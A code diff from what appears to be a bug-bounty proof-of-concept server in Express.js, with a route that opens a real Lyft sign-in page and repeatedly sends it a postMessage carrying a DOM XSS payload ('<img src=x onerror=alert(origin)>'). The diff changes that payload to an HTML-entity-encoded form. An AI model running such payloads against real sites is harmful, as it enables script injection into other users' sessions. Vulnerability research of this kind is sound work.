@@ -22,7 +22,7 @@ app.get("/CORSMisconfigurationCodeWithChrome", function (req, res) {
 app.get("/LyftPostMessageDOMXSS", function (req, res) {
    res.send(`<script>let wintabxss = open("https://biximontreal.lyft.net/sign-in?next=http%3A%2F%2Fbiximontreal.lyft.net%2Fprofile");
 setInterval(()=>{
-wintabxss.postMessage([{"reportingName":"\"><img src=x onerror=alert(origin)>","eventName":"c7cd1703_97fb_4e7d_9f20_f4f5f49a72d1","advertiserId":"68792028f297354dce5713ef","campaignId":"68792028f297354dce5713ef"}],"*")
+wintabxss.postMessage([{"reportingName":"&quot;&gt;&lt;img src=x onerror=alert(origin)&gt;","eventName":"c7cd1703_97fb_4e7d_9f20_f4f5f49a72d1","advertiserId":"68792028f297354dce5713ef","campaignId":"68792028f297354dce5713ef"}],"*")
 },1000)</script>`);
 });
 
